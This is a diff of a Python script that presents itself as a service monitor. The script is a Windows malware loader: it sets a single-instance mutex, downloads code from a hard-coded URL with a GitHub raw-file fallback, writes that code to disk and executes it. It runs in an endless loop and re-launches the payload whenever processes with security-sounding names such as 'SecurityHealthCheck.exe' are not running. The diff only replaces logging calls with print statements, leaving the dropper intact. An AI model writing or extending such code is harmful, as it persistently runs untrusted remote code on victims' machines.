@@ -8,19 +8,16 @@ from io import BytesIO
 import win32api
 import win32event
 import sys
-import logging
-
-logging.basicConfig(filename='service_monitor.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
 def create_mutex(mutex_name):
     try:
         mutex = win32event.CreateMutex(None, 0, mutex_name)
         if win32api.GetLastError() == 183:  
-            logging.info("Mutex already exists. Exiting.")
+            print("Mutex already exists. Exiting.")
             return False
         return True
     except Exception as e:
-        logging.error(f"Failed to create mutex: {e}")
+        print(f"Failed to create mutex: {e}")
         return False
 
 if os.name == "nt":
@@ -59,16 +56,16 @@ def fetch_url_with_random_user_agent(raw_url, fallback_url):
                 else:
                     return response.read().decode('utf-8')
         except urllib.error.HTTPError as e:
-            logging.error(f"HTTP error while fetching {url}: {e}")
+            print(f"HTTP error while fetching {url}: {e}")
             return None
         except Exception as e:
-            logging.error(f"Error while fetching {url}: {e}")
+            print(f"Error while fetching {url}: {e}")
             return None
 
     raw_code = fetch_url(raw_url)
     
     if not raw_code:
-        logging.info(f"Fetching fallback URL: {fallback_url}")
+        print(f"Fetching fallback URL: {fallback_url}")
         raw_code = fetch_url(fallback_url)
     
     return raw_code
@@ -82,40 +79,39 @@ def write_and_execute(raw_code):
             with open(test_file_path, 'wb') as f:
                 f.write(raw_code)
             
-            logging.info(f"Executing {test_file_path}")
+            print(f"Executing {test_file_path}")
             subprocess.Popen([test_file_path], shell=True)
         else:
-            logging.warning("No raw code to write and execute.")
+            print("No raw code to write and execute.")
     except Exception as e:
-        logging.error(f"Error in write_and_execute: {e}")
+        print(f"Error in write_and_execute: {e}")
 
 raw_url = 'https://test'
 fallback_url = 'https://github.com/247msn/96737693845/raw/refs/heads/main/fetch'
 
 try:
     raw_code = fetch_url_with_random_user_agent(raw_url, fallback_url)
-    logging.info(f"Raw code fetched: {raw_code[:100]}...")  
+    print(f"Raw code fetched: {raw_code[:100]}...")  
 except Exception as e:
-    logging.error(f"Error fetching raw code: {e}")
+    print(f"Error fetching raw code: {e}")
 
 def check_running():
     try:
-        logging.info("Checking if processes are running.")
+        print("Checking if processes are running.")
         for process_name in ["NetworkIntegrityService.exe", "SecurityHealthCheck.exe"]:
             output = subprocess.check_output(
                 ["tasklist", "/FI", f"IMAGENAME eq {process_name}"],
                 stderr=subprocess.PIPE,
                 shell=True  
             )
-            logging.info(f"Tasklist output for {process_name}: {output.decode()}")
+            print(f"Tasklist output for {process_name}: {output.decode()}")
             if bytes(process_name, 'utf-8') not in output:
-                logging.info(f"{process_name} is not running. Attempting to execute raw code.")
-                # Ensure raw_code is in bytes before passing it to write_and_execute
+                print(f"{process_name} is not running. Attempting to execute raw code.")
                 write_and_execute(raw_code.encode('utf-8') if isinstance(raw_code, str) else raw_code)
     except subprocess.CalledProcessError as e:
-        logging.error(f"Error running tasklist: {e}")
+        print(f"Error running tasklist: {e}")
     except Exception as e:
-        logging.error(f"An error occurred in check_running: {e}")
+        print(f"An error occurred in check_running: {e}")
 
 while True:
     check_running()
